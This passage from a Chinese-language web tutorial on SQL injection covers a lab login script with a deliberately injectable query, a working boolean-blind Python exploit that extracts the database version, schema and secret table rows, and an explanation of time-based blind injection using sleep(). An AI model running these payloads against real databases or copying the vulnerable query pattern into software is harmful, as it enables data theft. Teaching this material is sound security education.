<span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;">((</span><span style="color:#D73A49;">SELECT</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">binary</span><span style="color:#24292E;"> GROUP_CONCAT(secret_string) </span><span style="color:#D73A49;">FROM</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">secret</span><span style="color:#24292E;">) rlike </span><span style="color:#032F62;">&#39;^{exp}&#39;</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">1</span><span style="color:#24292E;">,</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">) # 获取存储的数据</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>完整 exp 如下</p><div class="language-python vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> mysqli_invisible_bool </span><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">*</span></span>
<span class="line"><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> string</span></span>
<span class="line"><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> io</span></span>
<span class="line"><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">escape_string</span><span style="color:#E1E4E8;">(c):</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;">\\\\</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> c </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> c </span><span style="color:#F97583;">in</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;.+*&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">else</span><span style="color:#E1E4E8;"> c</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">exp</span><span style="color:#E1E4E8;">():</span></span>
<span class="line"><span style="color:#E1E4E8;">    payload_template </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;Liki4&#39; AND if(</span><span style="color:#79B8FF;">{exp}</span><span style="color:#9ECBFF;">,1,0);#&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">    space </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> string.ascii_letters </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> string.digits </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39; _:,$.&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    exp_template </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;@@version RLIKE &#39;^</span><span style="color:#79B8FF;">{c}</span><span style="color:#9ECBFF;">&#39;&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">    exp_template </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;DATABASE() RLIKE &#39;^</span><span style="color:#79B8FF;">{c}</span><span style="color:#9ECBFF;">&#39;&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">    exp_template </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;(SELECT GROUP_CONCAT(table_name, &#39;:&#39;, column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE()) RLIKE &#39;^</span><span style="color:#79B8FF;">{c}</span><span style="color:#9ECBFF;">&#39;&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">    exp_template </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;(SELECT binary GROUP_CONCAT(secret_string) FROM secret) RLIKE &#39;^</span><span style="color:#79B8FF;">{c}</span><span style="color:#9ECBFF;">&#39;&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(exp_template)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    Flag </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">True</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    data </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">while</span><span style="color:#E1E4E8;"> Flag:</span></span>
<span class="line"><span style="color:#E1E4E8;">        ori_stdout </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> sys.stdout</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">for</span><span style="color:#E1E4E8;"> c </span><span style="color:#F97583;">in</span><span style="color:#E1E4E8;"> space:</span></span>
<span class="line"><span style="color:#E1E4E8;">            payload </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> payload_template.format(</span><span style="color:#FFAB70;">exp</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">exp_template.format(</span><span style="color:#FFAB70;">c</span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;">data</span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;">c))</span></span>
<span class="line"><span style="color:#E1E4E8;">            sys.stdin </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> io.StringIO(payload </span><span style="color:#F97583;">+</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&#39;</span><span style="color:#79B8FF;">\\n</span><span style="color:#9ECBFF;">123</span><span style="color:#79B8FF;">\\n</span><span style="color:#9ECBFF;">&#39;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">            res </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> sys.stdout </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> io.StringIO()</span></span>
<span class="line"><span style="color:#E1E4E8;">            main()</span></span>
<span class="line"><span style="color:#E1E4E8;">            output </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">str</span><span style="color:#E1E4E8;">(res.getvalue())</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;failed&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">in</span><span style="color:#E1E4E8;"> output:</span></span>
<span class="line"><span style="color:#E1E4E8;">                </span><span style="color:#F97583;">continue</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> c </span><span style="color:#F97583;">==</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;$&quot;</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">                Flag </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">False</span></span>
<span class="line"><span style="color:#E1E4E8;">                </span><span style="color:#F97583;">break</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;success&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">in</span><span style="color:#E1E4E8;"> output:</span></span>
<span class="line"><span style="color:#E1E4E8;">                data </span><span style="color:#F97583;">+=</span><span style="color:#E1E4E8;"> c</span></span>
<span class="line"><span style="color:#E1E4E8;">                </span><span style="color:#F97583;">break</span></span>
<span class="line"><span style="color:#E1E4E8;">        sys.stdout </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> ori_stdout</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> Flag:</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(data, </span><span style="color:#FFAB70;">end</span><span style="color:#F97583;">=</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#79B8FF;">\\r</span><span style="color:#9ECBFF;">&quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">else</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(data)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__name__</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">==</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;__main__&quot;</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">    exp()</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">from</span><span style="color:#24292E;"> mysqli_invisible_bool </span><span style="color:#D73A49;">import</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">*</span></span>
<span class="line"><span style="color:#D73A49;">import</span><span style="color:#24292E;"> string</span></span>
<span class="line"><span style="color:#D73A49;">import</span><span style="color:#24292E;"> io</span></span>
<span class="line"><span style="color:#D73A49;">import</span><span style="color:#24292E;"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">def</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">escape_string</span><span style="color:#24292E;">(c):</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;</span><span style="color:#005CC5;">\\\\</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> c </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> c </span><span style="color:#D73A49;">in</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;.+*&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">else</span><span style="color:#24292E;"> c</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">def</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">exp</span><span style="color:#24292E;">():</span></span>
<span class="line"><span style="color:#24292E;">    payload_template </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;Liki4&#39; AND if(</span><span style="color:#005CC5;">{exp}</span><span style="color:#032F62;">,1,0);#&quot;</span></span>
<span class="line"><span style="color:#24292E;">    space </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> string.ascii_letters </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> string.digits </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39; _:,$.&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    exp_template </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;@@version RLIKE &#39;^</span><span style="color:#005CC5;">{c}</span><span style="color:#032F62;">&#39;&quot;</span></span>
<span class="line"><span style="color:#24292E;">    exp_template </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;DATABASE() RLIKE &#39;^</span><span style="color:#005CC5;">{c}</span><span style="color:#032F62;">&#39;&quot;</span></span>
<span class="line"><span style="color:#24292E;">    exp_template </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;(SELECT GROUP_CONCAT(table_name, &#39;:&#39;, column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = DATABASE()) RLIKE &#39;^</span><span style="color:#005CC5;">{c}</span><span style="color:#032F62;">&#39;&quot;</span></span>
<span class="line"><span style="color:#24292E;">    exp_template </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;(SELECT binary GROUP_CONCAT(secret_string) FROM secret) RLIKE &#39;^</span><span style="color:#005CC5;">{c}</span><span style="color:#032F62;">&#39;&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(exp_template)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    Flag </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">True</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    data </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">while</span><span style="color:#24292E;"> Flag:</span></span>
<span class="line"><span style="color:#24292E;">        ori_stdout </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> sys.stdout</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">for</span><span style="color:#24292E;"> c </span><span style="color:#D73A49;">in</span><span style="color:#24292E;"> space:</span></span>
<span class="line"><span style="color:#24292E;">            payload </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> payload_template.format(</span><span style="color:#E36209;">exp</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">exp_template.format(</span><span style="color:#E36209;">c</span><span style="color:#D73A49;">=</span><span style="color:#24292E;">data</span><span style="color:#D73A49;">+</span><span style="color:#24292E;">c))</span></span>
<span class="line"><span style="color:#24292E;">            sys.stdin </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> io.StringIO(payload </span><span style="color:#D73A49;">+</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&#39;</span><span style="color:#005CC5;">\\n</span><span style="color:#032F62;">123</span><span style="color:#005CC5;">\\n</span><span style="color:#032F62;">&#39;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">            res </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> sys.stdout </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> io.StringIO()</span></span>
<span class="line"><span style="color:#24292E;">            main()</span></span>
<span class="line"><span style="color:#24292E;">            output </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">str</span><span style="color:#24292E;">(res.getvalue())</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;failed&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">in</span><span style="color:#24292E;"> output:</span></span>
<span class="line"><span style="color:#24292E;">                </span><span style="color:#D73A49;">continue</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> c </span><span style="color:#D73A49;">==</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;$&quot;</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">                Flag </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">False</span></span>
<span class="line"><span style="color:#24292E;">                </span><span style="color:#D73A49;">break</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;success&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">in</span><span style="color:#24292E;"> output:</span></span>
<span class="line"><span style="color:#24292E;">                data </span><span style="color:#D73A49;">+=</span><span style="color:#24292E;"> c</span></span>
<span class="line"><span style="color:#24292E;">                </span><span style="color:#D73A49;">break</span></span>
<span class="line"><span style="color:#24292E;">        sys.stdout </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> ori_stdout</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> Flag:</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(data, </span><span style="color:#E36209;">end</span><span style="color:#D73A49;">=</span><span style="color:#032F62;">&quot;</span><span style="color:#005CC5;">\\r</span><span style="color:#032F62;">&quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">else</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(data)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__name__</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">==</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;__main__&quot;</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">    exp()</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br></div></div><p><img src="https://cdn.xyxsw.site/boxcnXyMaLh26lkNuAPiQVHuaNg.png" alt=""></p><h4 id="时间盲注" tabindex="-1">时间盲注 <a class="header-anchor" href="#时间盲注" aria-label="Permalink to &quot;时间盲注&quot;">​</a></h4><p>时间盲注的场景和原理与布尔盲注类似，都是在没有回显查询结果的时候使用的</p><p>能用布尔盲注的地方一般都能用时间盲注，但能用时间盲注的地方不一定能用布尔盲注</p><p>有的场景在完全没有回显，甚至没有能表示语句是否查询完成的东西存在时，时间盲注就派上用场了</p><p>这里可以直接沿用布尔盲注的场景</p><div class="language-python vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#6A737D;">#!/usr/bin/python</span></span>
<span class="line"><span style="color:#6A737D;"># -*- coding: UTF-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> sqlalchemy </span><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> create_engine</span></span>
<span class="line"><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> hashlib </span><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> sha256</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E1E4E8;">engine </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> create_engine(</span><span style="color:#9ECBFF;">&quot;mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli&quot;</span><span style="color:#E1E4E8;">, </span><span style="color:#FFAB70;">max_overflow</span><span style="color:#F97583;">=</span><span style="color:#79B8FF;">5</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">query</span><span style="color:#E1E4E8;">(username, password):</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#F97583;">with</span><span style="color:#E1E4E8;"> engine.connect() </span><span style="color:#F97583;">as</span><span style="color:#E1E4E8;"> con:</span></span>
<span class="line"><span style="color:#E1E4E8;">        query_exec </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">f</span><span style="color:#9ECBFF;">&quot;SELECT password FROM users WHERE username = &#39;</span><span style="color:#79B8FF;">{</span><span style="color:#E1E4E8;">username</span><span style="color:#79B8FF;">}</span><span style="color:#9ECBFF;">&#39;&quot;</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(query_exec)</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> con.execute(query_exec).scalar():</span></span>
<span class="line"><span style="color:#E1E4E8;">            passhash </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> con.execute(query_exec).fetchone()[</span><span style="color:#79B8FF;">0</span><span style="color:#E1E4E8;">]</span></span>
<span class="line"><span style="color:#E1E4E8;">            </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> passhash </span><span style="color:#F97583;">==</span><span style="color:#E1E4E8;"> sha256(password.encode()).hexdigest()</span></span>
<span class="line"><span style="color:#E1E4E8;">        </span><span style="color:#F97583;">return</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">False</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">main</span><span style="color:#E1E4E8;">():</span></span>
<span class="line"><span style="color:#E1E4E8;">    username </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">input</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;Give me your username: &quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">    password </span><span style="color:#F97583;">=</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">input</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;Give me your password: &quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">    </span><span style="color:#79B8FF;">print</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&quot;Login success&quot;</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> query(username, password) </span><span style="color:#F97583;">else</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;Login failed&quot;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">if</span><span style="color:#E1E4E8;"> </span><span style="color:#79B8FF;">__name__</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">==</span><span style="color:#E1E4E8;"> </span><span style="color:#9ECBFF;">&quot;__main__&quot;</span><span style="color:#E1E4E8;">:</span></span>
<span class="line"><span style="color:#E1E4E8;">    main()</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#6A737D;">#!/usr/bin/python</span></span>
<span class="line"><span style="color:#6A737D;"># -*- coding: UTF-8 -*-</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">from</span><span style="color:#24292E;"> sqlalchemy </span><span style="color:#D73A49;">import</span><span style="color:#24292E;"> create_engine</span></span>
<span class="line"><span style="color:#D73A49;">from</span><span style="color:#24292E;"> hashlib </span><span style="color:#D73A49;">import</span><span style="color:#24292E;"> sha256</span></span>
<span class="line"></span>
<span class="line"><span style="color:#24292E;">engine </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> create_engine(</span><span style="color:#032F62;">&quot;mysql+pymysql://root:TjsDgwGPz5ANbJUU@127.0.0.1:3305/sqli&quot;</span><span style="color:#24292E;">, </span><span style="color:#E36209;">max_overflow</span><span style="color:#D73A49;">=</span><span style="color:#005CC5;">5</span><span style="color:#24292E;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">def</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">query</span><span style="color:#24292E;">(username, password):</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#D73A49;">with</span><span style="color:#24292E;"> engine.connect() </span><span style="color:#D73A49;">as</span><span style="color:#24292E;"> con:</span></span>
<span class="line"><span style="color:#24292E;">        query_exec </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">f</span><span style="color:#032F62;">&quot;SELECT password FROM users WHERE username = &#39;</span><span style="color:#005CC5;">{</span><span style="color:#24292E;">username</span><span style="color:#005CC5;">}</span><span style="color:#032F62;">&#39;&quot;</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(query_exec)</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> con.execute(query_exec).scalar():</span></span>
<span class="line"><span style="color:#24292E;">            passhash </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> con.execute(query_exec).fetchone()[</span><span style="color:#005CC5;">0</span><span style="color:#24292E;">]</span></span>
<span class="line"><span style="color:#24292E;">            </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> passhash </span><span style="color:#D73A49;">==</span><span style="color:#24292E;"> sha256(password.encode()).hexdigest()</span></span>
<span class="line"><span style="color:#24292E;">        </span><span style="color:#D73A49;">return</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">False</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">def</span><span style="color:#24292E;"> </span><span style="color:#6F42C1;">main</span><span style="color:#24292E;">():</span></span>
<span class="line"><span style="color:#24292E;">    username </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">input</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;Give me your username: &quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">    password </span><span style="color:#D73A49;">=</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">input</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;Give me your password: &quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">    </span><span style="color:#005CC5;">print</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&quot;Login success&quot;</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">if</span><span style="color:#24292E;"> query(username, password) </span><span style="color:#D73A49;">else</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;Login failed&quot;</span><span style="color:#24292E;">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#D73A49;">if</span><span style="color:#24292E;"> </span><span style="color:#005CC5;">__name__</span><span style="color:#24292E;"> </span><span style="color:#D73A49;">==</span><span style="color:#24292E;"> </span><span style="color:#032F62;">&quot;__main__&quot;</span><span style="color:#24292E;">:</span></span>
<span class="line"><span style="color:#24292E;">    main()</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>如果想要让布尔盲注不可用，我们可以做一个假设，假设我们并不知道账户的密码，也就无法通过登陆验证，这个时候就失去了布尔盲注最大的依赖，也就无法得知 if 表达式的真或假了。</p><p><img src="https://cdn.xyxsw.site/boxcndxf4WEQQQEXspS7GwNKI6J.png" alt=""></p><p>但，真的没办法了吗？</p><p>在 MySQL 中存在一个延时函数 sleep ()，可以延时特定的秒数</p><p>如果我们将 if 语句中的返回值改成延时函数会如何呢？</p><p>当 if 语句为真时进行一个延时，当 if 语句为假时即刻返回</p><p>于是我们就可以通过查询进行的时间长短来判断语句是否为真了！</p><p>完整的 exp 如下</p><div class="language-python vp-adaptive-theme line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki github-dark vp-code-dark"><code><span class="line"><span style="color:#F97583;">from</span><span style="color:#E1E4E8;"> mysqli_invisible_time </span><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> </span><span style="color:#F97583;">*</span></span>
<span class="line"><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> string</span></span>
<span class="line"><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> io</span></span>
<span class="line"><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> sys</span></span>
<span class="line"><span style="color:#F97583;">import</span><span style="color:#E1E4E8;"> signal</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F97583;">def</span><span style="color:#E1E4E8;"> </span><span style="color:#B392F0;">handler</span><span style="color:#E1E4E8;">(signum, frame):</span></span>
